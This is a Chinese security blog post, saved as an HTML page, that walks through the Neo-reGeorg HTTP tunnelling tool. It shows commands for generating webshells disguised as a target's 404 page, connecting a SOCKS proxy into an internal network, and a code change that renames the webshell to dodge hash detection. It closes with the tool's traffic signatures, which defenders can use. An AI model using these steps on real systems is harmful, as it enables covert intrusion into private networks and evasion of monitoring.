@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>浅谈隧道搭建工具之Neo-reGeorg | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简单介绍"><span class="toc-text">简单介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础功能分析"><span class="toc-text">基础功能分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端生成"><span class="toc-text">服务端生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端"><span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#类方法解释"><span class="toc-text">类方法解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据交互过程"><span class="toc-text">数据交互过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件特征"><span class="toc-text">文件特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#流量特征"><span class="toc-text">流量特征</span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">浅谈隧道搭建工具之Neo-reGeorg</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">01 25&nbsp;&nbsp;16:35:28</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p><strong>首发安全客</strong><br><code>https://www.anquanke.com/post/id/228917</code></p>
+<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">》》网址《《</a><br><strong>Neo-reGeorg</strong></p>
+<p>Neo-reGeorg 是一个旨在积极重构 reGeorg 的项目，特性：</p>
+<ul>
+<li>传输内容经过变形 base64 加密，伪装成 base64 编码</li>
+<li>直接请求响应可定制化 (如伪装的404页面)</li>
+<li>HTTP Headers 的指令随机生成，避免特征检测</li>
+<li>HTTP Headers 可定制化</li>
+<li>自定义 HTTP 响应码</li>
+<li>多 URL 随机请求</li>
+<li>服务端 DNS 解析</li>
+<li>兼容 python2 / python3</li>
+<li>服务端环境的高兼容性</li>
+<li>参考 pivotnacci 实现单 Session 创建多 TCP 连接，应对部分负载均衡场景</li>
+<li>支持内网转发，应对负载均衡环境</li>
+</ul>
+<p>命令行分为两大块，<code>服务端生成命令块</code>和<code>客户端命令块</code><br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff55c4e416f842447000000.png" alt><br><br><br><br><br>对于攻防来讲，公开的工具都需要自定义修改，关键时刻才能使用。</p>
+<h2 id="基础功能分析"><a href="#基础功能分析" class="headerlink" title="基础功能分析"></a>基础功能分析</h2><h3 id="服务端生成"><a href="#服务端生成" class="headerlink" title="服务端生成"></a>服务端生成</h3><p>命令行介绍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">D:\Neo-reGeorg-2.3.2&gt;python3 neoreg.py generate -h</span><br><span class="line">usage: neoreg.py [-h] -k KEY [-o DIR] [-f FILE] [-c CODE] [--read-buff Bytes]</span><br><span class="line"></span><br><span class="line">Generate neoreg webshell</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">    // 指定连接密钥。 就是连接时的密码</span><br><span class="line">  -k KEY, --key KEY     Specify connection key. </span><br><span class="line">    // 生成的webshell存放的目录</span><br><span class="line">  -o DIR, --outdir DIR  Output directory.</span><br><span class="line">    // 参照的模板html文件，一般下载目标的404、403页面作为模板。</span><br><span class="line">  -f FILE, --file FILE  Camouflage html page file</span><br><span class="line">    // webshell的响应码，建议对应模板。</span><br><span class="line">  -c CODE, --httpcode CODE</span><br><span class="line">                        Specify HTTP response code. When using -r, it is</span><br><span class="line">                        recommended to &lt;400. (default: 200)</span><br><span class="line">    // 数据交互时，一次读取多少bytes字符</span><br><span class="line">  --read-buff Bytes     Remote read buffer. (default: 513)</span><br></pre></td></tr></table></figure></p>
+<p>新增的404页面生成功能对于隐藏服务端文件挺好的思路，实战时直接下载目标的404页面即可当作模板。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 连接密码langke、模板文件404.html、响应码：404</span><br><span class="line">#&gt;：python3 neoreg.py generate -k langke --file 404.html --httpcode 404</span><br></pre></td></tr></table></figure></p>
+<p>生成失败，未给出原因：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">D:\Neo-reGeorg-2.3.2&gt;python3 neoreg.py generate -k langke -f 404.html -c 404</span><br><span class="line"></span><br><span class="line">·······</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [ Github ] https://github.com/L-codes/neoreg</span><br><span class="line"></span><br><span class="line">    [+] Create neoreg server files:</span><br><span class="line">[ERROR              ]  Failed to read file: 404.html</span><br></pre></td></tr></table></figure></p>
+<p>自己定位到相关位置，查看错误原因：<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff55eb5416f842447000001.png" alt><br>488行添加打印报错代码得知，python3默认使用<code>GBK</code>打开模板文件<code>404.html</code>，只需要在486行打开文件时，用<code>utf-8</code>格式打开文件即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">484 def file_read(filename):</span><br><span class="line">485     try:</span><br><span class="line">486         with open(filename, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">487             return f.read()</span><br><span class="line">488     except Exception as e:</span><br><span class="line">489         print(e)</span><br><span class="line">490         log.error(&quot;Failed to read file: %s&quot; % filename)</span><br><span class="line">491         exit()</span><br></pre></td></tr></table></figure></p>
+<p>自动在工具根目录生成文件夹<code>neoreg_servers</code>，里边包括key存放文件，和<code>ashx</code>、<code>aspx</code>、<code>jsp</code>、<code>jspx</code>、<code>php</code>等类型的webshell服务端。选择目标服务器可解析格式上传。<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff5bbc306a8545681000000.png" alt><br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff5bc2606a8545681000001.png" alt></p>
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>命令行介绍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">D:\Neo-reGeorg-2.3.2&gt;python3 neoreg.py -h</span><br><span class="line">usage: neoreg.py [-h] -u URI [-r URL] -k KEY [-l IP] [-p PORT] [-s] [-H LINE]</span><br><span class="line">                 [-c LINE] [-x LINE] [--local-dns] [--read-buff Bytes]</span><br><span class="line">                 [--read-interval MS] [--max-threads N] [-v]</span><br><span class="line"></span><br><span class="line">Socks server for Neoreg HTTP(s) tunneller. DEBUG MODE: -k</span><br><span class="line">(debug_all|debug_base64|debug_headers_key|debug_headers_values)</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">    // 指定webshell地址</span><br><span class="line">  -u URI, --url URI     The url containing the tunnel script</span><br><span class="line">    // 指定内网转发的webshell地址，就是通过目标及连接目标内网的webshell。</span><br><span class="line">  -r URL, --redirect-url URL</span><br><span class="line">                        Intranet forwarding the designated server (only</span><br><span class="line">                        jsp(x))</span><br><span class="line">    // 指定webshell的连接密码</span><br><span class="line">  -k KEY, --key KEY     Specify connection key</span><br><span class="line">    // 连接到目标内网的代理，在本地监听的IP</span><br><span class="line">  -l IP, --listen-on IP</span><br><span class="line">                        The default listening address.(default: 127.0.0.1)</span><br><span class="line">    // 代理监听的端口，选择一个未使用的即可</span><br><span class="line">  -p PORT, --listen-port PORT</span><br><span class="line">                        The default listening port.(default: 1080)</span><br><span class="line">    // 跳过可用性测试，如果生成webshell时使用了模板，即-f参数，连接时此参数必须。</span><br><span class="line">  -s, --skip            Skip usability testing</span><br><span class="line">    // 自定义请求头</span><br><span class="line">  -H LINE, --header LINE</span><br><span class="line">                        Pass custom header LINE to server</span><br><span class="line">    // 自定义cookie</span><br><span class="line">  -c LINE, --cookie LINE</span><br><span class="line">                        Custom init cookies</span><br><span class="line">    // 前置代理，连接webshell之前需要连接的代理</span><br><span class="line">  -x LINE, --proxy LINE</span><br><span class="line">                        Proto://host[:port] Use proxy on given port</span><br><span class="line">    // 使用本地搭建的DNS服务器解析域名。</span><br><span class="line">  --local-dns           Use local resolution DNS</span><br><span class="line">    // 每个post请求发送的最大数据量。</span><br><span class="line">  --read-buff Bytes     Local read buffer, max data to be sent per</span><br><span class="line">                        POST.(default: 2048 max: 2600)</span><br><span class="line">    // 读取数据间隔（毫秒）。</span><br><span class="line">  --read-interval MS    Read data interval in milliseconds.(default: 100)</span><br><span class="line">    // 代理最大线程数。本地搭建的连接到目标内网的代理，最多可连接多少个。</span><br><span class="line">  --max-threads N       Proxy max threads.(default: 1000)</span><br><span class="line">  -v                    Increase verbosity level (use -vv or more for greater</span><br><span class="line">                        effect)</span><br></pre></td></tr></table></figure></p>
+<p>连接服务端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 代理监听在本地的1081端口，前置代理使用本地的8080端口，主要是为了把流量转发到burp上，方便查看。</span><br><span class="line">python3 neoreg.py -k langke -u http://192.168.4.100/tunnel.php -p 1081 -x http://127.0.0.1:8080 -vv</span><br><span class="line">// 代理搭建成功</span><br><span class="line">netstat -ano | findstr /i 1081</span><br><span class="line">  TCP    127.0.0.1:1081         0.0.0.0:0              LISTENING       7784</span><br></pre></td></tr></table></figure></p>
+<p>使用代理<br>Proxifier配置代理：SOCKS5://127.0.0.1:1081<br>通过代理，连接目标内网主机192.168.4.7的22端口：<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff844c259fee22d75000000.png" alt></p>
+<h3 id="类方法解释"><a href="#类方法解释" class="headerlink" title="类方法解释"></a>类方法解释</h3><p>在开始之前，先来分析一下脚本功能逻辑。<br>全局变量解释：<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff867cf59fee22d75000001.png" alt></p>
+<p>主要类函数解释：<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff86d9759fee22d75000003.png" alt></p>
+<p>核心类解释：<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff874b859fee22d75000004.png" alt></p>
+<h2 id="数据交互过程"><a href="#数据交互过程" class="headerlink" title="数据交互过程"></a>数据交互过程</h2><p><strong>暂以php为例</strong></p>
+<p><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff9403e59fee22d75000006.png" alt></p>
+<p>neoreg的数据交互过程大概是这个样子，socks代理数据是包裹在http协议里边的，对方能抓到的，http协议相关数据包和web服务器向目标建立的socks连接。<br>站在攻的角度，先来聊聊本机和web服务器之间得数据包得特征隐藏。</p>
+<h2 id="文件特征"><a href="#文件特征" class="headerlink" title="文件特征"></a>文件特征</h2><p>首先，是上传webshell阶段。检测木马文件最常用得办法就是文件hash了，所以生成webshehll服务端时，可以通过设定不同的-k、-f和-c参数修改默认值，从而避开hash检测。<br><code>-k</code>：主要影响webshell文件中的随机字符串，主要位置在headers的键值。<br><code>-f</code>：主要影响webshell文件最后位置，exit函数运行结束后打印的html代码。<br><code>-c</code>：主要影响webshell文件设定的响应状态码。</p>
+<p>然后就是webshell的文件名了，这个并未提供参数，添加一个。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 558行添加</span><br><span class="line">parser.add_argument(&quot;-n&quot;, &quot;--filename&quot;, metavar=&quot;FILENAME&quot;, help=&quot;webshell name&quot;, default=&quot;tunnel&quot;)</span><br><span class="line">// 739行下面添加</span><br><span class="line">            outfilename = filename.replace(&apos;tunnel.&apos;, args.filename + &apos;.&apos;)</span><br><span class="line">            outfile = os.path.join(outdir, outfilename)</span><br><span class="line">// 770行改为入下</span><br><span class="line">outfile = os.path.join(outdir, filename.replace(&apos;tunnel.&apos;, args.filename + &apos;_compatibility.&apos;))</span><br></pre></td></tr></table></figure></p>
+<p>使用时加<code>-n</code> 参数即可，如果不加<code>-n</code>参数，默认文件名为<code>tunnel</code>。</p>
+<h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><p>由于作者采用随机数方法，所以流量特征并不是很明显。主要有以下几点：</p>
+<ul>
+<li><p>如果生成webshell时，未加<code>-f</code>参数，访问webshehll时，响应体是如下格式，中间字符串长度不固定。并且除此之外，无其他字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- cMI1RecF6sIAaPpB3or1QxCmxO --&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>每次利用代理连接目标时，请求头中都是有一个键名随机长度，值为目标IP和端口的自定义base64加密结果，不过，长度和正常base64加密后的数据长度一样。<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff9813f59fee22d75000008.png" alt><br>内网IP加端口最长28个字符，最短16个字符<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/内网渗透/浅谈隧道搭建工具之Neo-reGeorg/5ff9810859fee22d75000007.png" alt></p>
+</li>
+<li><p>还有就是，一般header头的键都是可读的，而工具随机生成的键名会显得突兀。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rjuclkefrmdnyws</span><br><span class="line">Ihxsrramyvbzuciw</span><br><span class="line">Mbwqvjrtbrsq</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+
+        <!--
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/python/"># python</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        -->
+        <!--
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2021/07/27/我的漏洞分析学习之路二/">我的漏洞分析学习之路二</a>
+            
+            
+            <a class="next" rel="next" href="/2021/01/21/bypass-AV-探索一/">bypass AV 探索一</a>
+            
+        </section>
+        -->
+
+    </article>
+</div>
+
+        </div>
+        <!--
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    	-->
+
+    	<br>
+    	<br>
+    	<br>
+
+
+
+    </div>
+</body>
+</html>
